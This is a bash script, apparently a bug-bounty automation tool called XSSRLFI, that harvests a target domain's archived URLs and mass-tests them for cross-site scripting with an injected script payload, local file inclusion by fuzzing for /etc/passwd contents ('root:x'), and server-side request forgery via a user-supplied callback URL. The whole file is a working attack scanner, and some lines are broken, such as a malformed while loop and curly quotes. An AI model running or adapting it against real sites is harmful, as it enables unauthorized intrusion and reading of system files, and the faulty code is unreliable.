#!/bin/bash

VERSION="0.1"

TARGET=$1

WORKING_DIR=$(cd -P -- "$(dirname -- "$0")" && pwd -P)
WORDLIST_PATH="$WORKING_DIR/wordlists" 
RESULTS_PATH="$WORKING_DIR/results/$TARGET"
XSS_PATH="$RESULTS_PATH/XSS"
LFI_PATH="$RESULTS_PATH/LFI"
SSRF_PATH="$RESULTS_PATH/SSRF"

RED="\033[1;31m"
RED="\033[1;31m"
GREEN="\033[1;32m"
BLUE="\033[1;36m"
YELLOW="\033[1;33m"
RESET="\033[0m"

displayLogo(){
echo -e "


XSSRLFI

${RED}v$VERSION${RESET} by ${YELLOW}@yuraveon${RESET}
"
}

sourcee(){
  echo "Sourcing profile"
  source ~/.profile
}

checkArgs(){
    if [[ $# -eq 0 ]]; then
        echo -e "${RED}[+] Usage:${RESET} $0 <domain>\n"
        exit 1
    fi
}

inputPayload(){
    echo "${GREEN}--==[ Payload ]==--${RESET}"
    echo "Please input your payload"  
    echo "XSS Payload (left blank for default): "
    read XSS_PAYLOAD
    if [ -z "$XSS_PAYLOAD" ]
    then
        XSS_PAYLOAD='"><script>confirm(1)</script>'
        XSS_POC='<script>confirm(1)'
    else
        echo "XSS POC: "
        read XSS_POC
    fi
    echo -e "XSS Payload is $XSS_PAYLOAD and the POC is $XSS_POC"

    echo "SSRF Payload (your BurpCollaborator or interactsh url):"
    read SSRF_URL
    if [ -z "$SSRF_URL" ]
    then
        echo "Cannot left blank"
        exit
    fi
    echo "SSRF Payload is $SSRF_URL"
}

runBanner(){
    name=$1
    echo -e "${RED}\n[+] Running $name...${RESET}"
}


setupDir(){
    echo -e "${GREEN}--==[ Setting things up ]==--${RESET}"
    echo -e "${RED}\n[+] Creating results directories...${RESET}"
    rm -rf $RESULTS_PATH
    mkdir -p $XSS_PATH $LFI_PATH $SSRF_PATH
    echo -e "${BLUE}[*] $XSS_PATH${RESET}"
    echo -e "${BLUE}[*] $LFI_PATH${RESET}"
    echo -e "${BLUE}[*] $SSRF_PATH${RESET}"
}

waybackurls(){
    runBanner "waybackurls"
    ~/go/bin/waybackurls $TARGET | tee -a $RESULTS_PATH/waybackurls.txt
}

xssTest(){
    echo -e "${GREEN}\n--==[ XSS Testing ]==--${RESET}"
    
    runBanner "XSS-Payload Injection"
    cat $RESULTS_PATH/waybackurls.txt | ~/go/bin/gf xss | grep 'source=' | ~/go/bin/qsreplace $XSS_PAYLOAD | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs $XSS_POC && echo -e "$host" ; done | tee $XSS_PATH/xss_vuln.txt

    echo -e "${BLUE}[*] Check the results at $RESULTS_PATH/XSS${RESET}"
}

lfiTest(){
    echo -e "${GREEN}--==[ LFI Testing ]==--${RESET}"
    
    cat $RESULTS_PATH/waybackurls.txt | ~/go/bin/gf lfi | ~/go/bin/qsreplace FUZZ > $LFI_PATH/lfi-fuzz.txt

    runBanner "FFUF"
    for url in $(cat $LFI_PATH/lfi-fuzz.txt); do
        ~/go/bin/ffuf -u $url -mr “root:x” -w $WORDLIST_PATH/PayloadsAllTheThings/File\ Inclusion/Intruders/JHADDIX_LFI.txt ; 
    done
}

ssrfTest(){


    echo $TARGET | ~/go/bin/httpx -silent -threads 1000 | ~/go/bin/gau |  grep "=" | ~/go/bin/qsreplace $SSRF_URL
}


displayLogo

sourcee
checkArgs $TARGET
inputPayload

setupDir

waybackurls
xssTest
lfiTest
ssrfTest

echo -e "${GREEN}\n--==[ DONE ]==--${RESET}"